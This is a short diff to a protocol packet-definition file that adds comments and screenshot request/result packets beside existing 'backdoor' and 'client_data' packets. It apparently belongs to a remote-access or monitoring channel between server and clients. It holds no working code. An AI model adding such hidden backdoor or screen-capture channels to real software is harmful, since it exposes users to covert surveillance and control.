@@ -11,10 +11,17 @@ This packet multiplexes the communication between the server and the client by w
 # It technically starts at 99 but it increments to 100 on the first packet.
 start_id = 100
 packets = [
+    # Backdoor
     "backdoor_request",
     "backdoor_result",
+
+    # Client Data
     "client_data_request",
-    "client_data_result"
+    "client_data_result",
+
+    # Screenshot
+    "screenshot_request",
+    "screenshot_result",
 ]
 
 [[fields]]
